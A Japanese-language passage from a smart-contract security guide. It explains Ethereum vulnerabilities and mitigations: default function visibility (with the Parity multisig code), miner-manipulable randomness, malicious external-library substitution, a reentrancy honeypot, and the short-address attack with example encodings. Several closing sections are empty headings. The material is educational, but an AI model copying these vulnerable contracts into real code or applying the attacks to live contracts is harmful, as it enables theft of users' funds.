これはアドレス推測の賞金ゲームとして簡単に設計されています。このゲームに勝利するには、ユーザーは最後8桁の16進数文字が0のEthereumアドレスを生成しなければなりません。もしクリアすると、賞金を手に入られるwithdrawWinnings関数を呼び出すことができます。

しかし残念ながら、関数のvisibilityが指定されていません。特に_sendWinnings関数はpublicなので、どんなアドレスでも呼び出して賞金を盗むことができます。

=== 対策

よい対策としては、たとえpublicであったとしてもコントラクト内のすべての関数のvisibilityを常に指定することです。最近のバージョンのsolcは実践を促すために、明示的にvisibilityをセットしていない関数に警告を出します。

=== 現実としての事例: Parity Multisig Wallet (First Hack)

最初のParity Multisig Walletのハッキングで、31Mドルが３つのウォレットから盗まれました。

そのマルチシグウォレットは主要な関数を持つライブラリコントラクトを呼び出す基本的なWalletコントラクトから構築されています。そのライブラリのコントラクトにはウォレットを初期化するコードも含まれています。

[source, Javascript]
------
contract WalletLibrary is WalletEvents {

  ...

  // METHODS

  ...

  // constructor is given number of sigs required to do protected
  // "onlymanyowners" transactionsas well as the selection of addresses
  // capable of confirming them
  function initMultiowned(address[] _owners, uint _required) {
    m_numOwners = _owners.length + 1;
    m_owners[1] = uint(msg.sender);
    m_ownerIndex[uint(msg.sender)] = 1;
    for (uint i = 0; i < _owners.length; ++i)
    {
      m_owners[2 + i] = uint(_owners[i]);
      m_ownerIndex[uint(_owners[i])] = 2 + i;
    }
    m_required = _required;
  }

  ...

  // constructor - just pass on the owner array to multiowned and
  // the limit to daylimit
  function initWallet(address[] _owners, uint _required, uint _daylimit) {
    initDaylimit(_daylimit);
    initMultiowned(_owners, _required);
  }
}
------

いずれの関数もvisibilityを指定しておらず、両方ともデフォルトのpublicです。これらの関数がpublicであったために、攻撃者はデプロイされたコントラクト上のこれらの関数を呼び出し、所有者を攻撃者のアドレスにリセットしました。所有者になったので、攻撃者はすべてのetherを流出させました。

== エントロピーの錯覚

Etheruemブロックチェーン上のすべてのトランザクションは決定論的な状態遷移をする操作です。つまり全てのトランザクションは不確実性はなく、計算可能な方法でEthereumエコシステムのグローバルな状態を変更します。これはEthereumにはランダム性やエントロピーの源泉がないという示唆でもあります。分散的なランダム性やエントロピーを達成するのはたくさんの解決策も提案されている有名な課題です。

=== 脆弱性

Ethereum上に作られた初めのコントラクトのいくつかはギャンブルを元にしているものでした。基本的、ギャンブルは不確実性を必要としますが、ブロックチェーン上でギャンブルのシステムを作るのは難しいです。不確実性は外部からブロックチェーンに取り入れる必要があるというのは明らかです。これはプレイヤー間の賭けでは可能ですが、ハウス（主催者）として振る舞うコントラクトを実装したい場合ははるかに難しくなります。共通の落とし穴はハッシュやタイムスタンプ、ブロック番号やgas上限など未知の値を含む変数である、未来のブロック変数を使用することです。この問題はブロックをマイニングするマイナーによって操作されてしまい、実際はランダムにならないということです。例えば、次のブロックハッシュが偶数番号で終わっていたらブラックナンバーを返すロジックを持つルーレットスマートコントラクトを考えてみましょう。マイナーはブラックに1Mドルを賭けるでしょう。もしマイナーらが次のブロックを採掘して、奇数で終わるハッシュを見つけた場合、彼らはそのブロックを公開せずに偶数番号のハッシュのブロックを採掘するまで別のブロックをマイニングします（ブロック報酬と手数料が1Mドルより低いという想定）。過去や現在の変数を使用することはさらに危険です。さらにブロック変数を単独で使用することはあるブロックのトランザクションの疑似乱数がすべて同じになることを意味し、攻撃者はブロック内のトランザクションをすべて実行して勝利を増やすことができます。

=== 対策

エントロピーやランダム性の源泉はブロックチェーンの外部である必要があります。これはcommit–revealのようなシステムを備えるピア間で実行されるか、トラストモデルを参加者のグループへ変更することによって行うことができます。これはまたランダム性オラクルとして振る舞う中央集権的なエンティティを介して行うことができます。一般的に、ブロック変数はマイナーが操作することができるのでエントロピーの源泉として使用するべきではありません。

=== 現実としての事例: PRNG Contracts

2018年2月のArseny Reutovによる分析によると、疑似乱数の類を使用している動いているスマートコントラクトの数は3649個であり、43のコントラクトは悪用されている可能性があることを発見した。

== 外部コントラクトの参照

Ethereumワールドコンピュータの利点の１つはコードの再利用ができたり、すでにネットワークにデプロイされているコントラクトと相互作用することができることです。結果として、外部呼び出しメッセージを介して大量のコントラクトが外部コントラクトを参照しています。これらの外部呼び出しは悪意のあるユーザーの意図を明白ではない方法によって隠すことができます。

=== 脆弱性

Solidityでは、そのアドレスのコードがキャストされるコントラクトタイプを表すかに関係なく、どんなアドレスでもコントラクトにキャストできます。これは特にコントラクトの作成者が悪意のあるコードを隠すときに、問題を引き起こします。例を見てみましょう。

[source, Javascript]
------
// encryption contract
contract Rot13Encryption {

   event Result(string convertedString);

    // rot13-encrypt a string
    function rot13Encrypt (string text) public {
        uint256 length = bytes(text).length;
        for (var i = 0; i < length; i++) {
            byte char = bytes(text)[i];
            // inline assembly to modify the string
            assembly {
                // get the first byte
                char := byte(0,char)
                // if the character is in [n,z], i.e. wrapping
                if and(gt(char,0x6D), lt(char,0x7B))
                // subtract from the ASCII number 'a',
                // the difference between character <char> and 'z'
                { char:= sub(0x60, sub(0x7A,char)) }
                if iszero(eq(char, 0x20)) // ignore spaces
                // add 13 to char
                {mstore8(add(add(text,0x20), mul(i,1)), add(char,13))}
            }
        }
        emit Result(text);
    }

    // rot13-decrypt a string
    function rot13Decrypt (string text) public {
        uint256 length = bytes(text).length;
        for (var i = 0; i < length; i++) {
            byte char = bytes(text)[i];
            assembly {
                char := byte(0,char)
                if and(gt(char,0x60), lt(char,0x6E))
                { char:= add(0x7B, sub(char,0x61)) }
                if iszero(eq(char, 0x20))
                {mstore8(add(add(text,0x20), mul(i,1)), sub(char,13))}
            }
        }
        emit Result(text);
    }
}
------

このコードは文字列を取り、13個右にずらすだけのシンプルに暗号化するものです。

次のコントラクトはその暗号化を使用したものです。

[source, Javascript]
------
import "Rot13Encryption.sol";

// encrypt your top-secret info
contract EncryptionContract {
    // library for encryption
    Rot13Encryption encryptionLibrary;

    // constructor - initialize the library
    constructor(Rot13Encryption _encryptionLibrary) {
        encryptionLibrary = _encryptionLibrary;
    }

    function encryptPrivateData(string privateInfo) {
        // potentially do some operations here
        encryptionLibrary.rot13Encrypt(privateInfo);
     }
 }
------

このコントラクトの問題点はencryptionLibraryアドレスがpublicでない、もしくは定数でないことです。したがって、このコントラクトの開発者はconstructor内でこのコントラクトを指し示すアドレスを与えることが出来てしまっています。

[source, Javascript]
------
// encryption contract
contract Rot26Encryption {

   event Result(string convertedString);

    // rot13-encrypt a string
    function rot13Encrypt (string text) public {
        uint256 length = bytes(text).length;
        for (var i = 0; i < length; i++) {
            byte char = bytes(text)[i];
            // inline assembly to modify the string
            assembly {
                // get the first byte
                char := byte(0,char)
                // if the character is in [n,z], i.e. wrapping
                if and(gt(char,0x6D), lt(char,0x7B))
                // subtract from the ASCII number 'a',
                // the difference between character <char> and 'z'
                { char:= sub(0x60, sub(0x7A,char)) }
                // ignore spaces
                if iszero(eq(char, 0x20))
                // add 26 to char!
                {mstore8(add(add(text,0x20), mul(i,1)), add(char,26))}
            }
        }
        emit Result(text);
    }

    // rot13-decrypt a string
    function rot13Decrypt (string text) public {
        uint256 length = bytes(text).length;
        for (var i = 0; i < length; i++) {
            byte char = bytes(text)[i];
            assembly {
                char := byte(0,char)
                if and(gt(char,0x60), lt(char,0x6E))
                { char:= add(0x7B, sub(char,0x61)) }
                if iszero(eq(char, 0x20))
                {mstore8(add(add(text,0x20), mul(i,1)), sub(char,26))}
            }
        }
        emit Result(text);
    }
}
------

このコントラクトは26文字ずらすROT26を使用していますが、詳しく見る必要はないです。

[source, Javascript]
------
contract Print{
    event Print(string text);

    function rot13Encrypt(string text) public {
        emit Print(text);
    }
 }
------

もしこれらのコントラクトのいずれかのアドレスがconstructor内で与えられていたら、encryptPrivateData関数は暗号化されていないprivateデータを表示するeventを生成するでしょう。ライブラリ風のコントラクトがconstructor内でセットされていたのにも関わらず、所有者などの権限のあるユーザーによってライブラリコントラクトのアドレスが変更されてしまうケースがよくあります。リンクしているコントラクトが呼び出せる関数を持っていない場合、fallback関数が実行されます。例えば、encryptionLibrary.​rot13Encrypt()の行でencryptionLibraryによって指定されたコントラクトが次の場合

[source, Javascript]
------
contract Blank {
    event Print(string text);
    function () {
        emit Print("Here");
        // put malicious code here and it will run
    }
}
------

この時テキストHereでeventは発火します。したがって、ユーザーがコントラクトライブラリを変更すれば、原則として他のユーザーに無意識に任意のコード実行させることができます。

=== 対策

前述のように、安全なコントラクトは悪意のある方法によってデプロイすることができます。監査人は公にコントラクトを検証し、その所有者に悪意のある方法でデプロイさせることができます。その結果として、公に監査されたコントラクトは脆弱性を持ったり、悪意のあるものになります。

これらのシナリオを防ぐ方法はたくさんあります。以下がnewというkeywordを使ってコントラクトを作成して防止する一例です。

[source, Javascript]
------
constructor() {
    encryptionLibrary = new Rot13Encryption();
}
------

参照するコントラクトのインスタンスをデプロイするときに作成するこの方法なら、デプロイする人にRot13Encryption自体を変えない限り、置き換えられることはなくなります。

他の解決策としては外部コントラクトのアドレスをハードコーディングする方法があります。

一般的に外部コントラクトを呼び出すコードは常に注意深く監査されているべきです。開発者にとって、外部コントラクトを定義する際にコントラクトアドレスをpublicにしておくことは、ユーザーがコントラクトによって参照されているコードを簡単に調べられることを可能にするので良い考えです。しかし反対に、コントラクトがprivateなコントラクトアドレス変数を持っていた場合、何者かが悪意を持って行動している兆候の可能性があります。ユーザーが外部関数を呼び出すために使用されているコントラクトアドレスを変更できる場合、何のコードが変更されたかをユーザーが確認したり、新しいコントラクトアドレスで選択する機会を与えるためにタイムロックや投票メカニズムを実装することが重要です。

=== 現実の事例として: Reentrancy Honey Pot

メインネットには多くのhoney potsがリリースされ続けています。これらのコントラクトはコントラクトを悪用しようとするEthereumハッカーを出し抜こうとしているが、ハッカーらが悪用しようとするコントラクトへとetherを流出させてしまっています。

以下例です。

[source, Javascript]
------
pragma solidity ^0.4.19;

contract Private_Bank
{
    mapping (address => uint) public balances;
    uint public MinDeposit = 1 ether;
    Log TransferLog;

    function Private_Bank(address _log)
    {
        TransferLog = Log(_log);
    }

    function Deposit()
    public
    payable
    {
        if(msg.value >= MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
        }
    }

    function CashOut(uint _am)
    {
        if(_am<=balances[msg.sender])
        {
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,"CashOut");
            }
        }
    }

    function() public payable{}

}

contract Log
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;
    Message LastMsg;

    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}
------

コントラクト内にあるreentrancyバグを悪用することによって1etherが失われました。

== 短いアドレスやパラメータの攻撃

この攻撃はSolidityコントラクト上で実施されるわけでなく、コントラクトと相互作用するサードパーティのアプリケーション上で発生します。この章ではコントラクトでパラメータがどのように操作されるかを確認しましょう。

=== 脆弱性

コントラクトにパラメータを渡す際、パラメータはABI仕様にエンコードされます。そして想定の長さよりも短いエンコードされたパラメータを送ることができます。そのような場合、EVMは想定どおりの長さにするためにエンコードされたパラメータの終端にゼロを付け加えます。このためサードパーティのアプリケーションがinputを検証しない場合問題が発生します。わかりやすい例はユーザーが出金を要求するときに、取引所がERC20トークンのアドレスを検証しない場合です。

パラメータの順序に注意して、標準的なERC20のtransfer関数を考えてみましょう。

[source, Javascript]
------
function transfer(address to, uint tokens) public returns (bool success);
------

大量のトークンを保有している取引所と100トークン出金したいユーザーがいると考えます。ユーザーがアドレス0xdeaddeaddeaddeaddeaddeaddeaddeaddeaddeadとトークンの数100を提出します。取引所はこれらのパラメータをtransfer関数によって順番通りにエンコードします。

エンコード結果
[source]
------
a9059cbb000000000000000000000000deaddeaddea \
ddeaddeaddeaddeaddeaddeaddead0000000000000
000000000000000000000000000000000056bc75e2d63100000
------

最初の4バイト（a9059cbb）はtransfer関数の署名かセレクターであり、次の32バイトはアドレスで、最後の32バイトはuint256でトークンの数を表しています。最後の16進数56bc75e2d63100000は100トークンと対応しています。1バイト欠けたアドレスを送った場合に何が起きるかを見てみましょう。特に攻撃者がアドレスとして0xdeaddeaddeaddeaddeaddeaddeaddeaddeaddeと出金するために同様にトークン100を送ると何が起きるかです。取引所がこのinputを検証しない場合、エンコードすると以下になります。

[source]
------
a9059cbb000000000000000000000000deaddeaddea \
ddeaddeaddeaddeaddeaddeadde00000000000000
00000000000000000000000000000000056bc75e2d6310000000
------

違いはわずかしかありません。エンコードされた最後に00が追加されていることに注目しましょう。これがスマートコントラクトに送信されると、アドレスパラメータは0xdeaddeaddeaddeaddeaddeaddeaddeaddeadde00として読み取られ、値（トークン量）は56bc75e2d6310000000（最後２つの0が余分）として読み取られるでしょう。この値は25600トークンです。もし取引所が大量のトークンを保有していたら、ユーザーは変更したアドレスへ25600トークンを引き出せてしまいます。この例では攻撃者は変更したアドレスを渡していませんが、もし攻撃者が0で終わるアドレスを生成してそれを使用したら、検証しない取引所からトークンを盗み出せます。

=== 対策

外部アプリケーションで入力されるパラメータはブロックチェーンに送る前にすべて検証するべきです。またここではパラメータのの順序も重要ということに気をつけるべきです。paddingは最後にのみ発生するので、スマートコントラクトでのパラメータの順序を気をつけるとこの攻撃のいくらかは緩和することが出来ます。

== 未確認な呼び出しの返り値

== 競争条件とフロントランニング

== Dos攻撃

== ブロックタイムスタンプの操作

== Constructors with care

== 初期化していないストレージのポインタ

== 浮動小数点と精度

== コントラクトライブラリ

== 結論
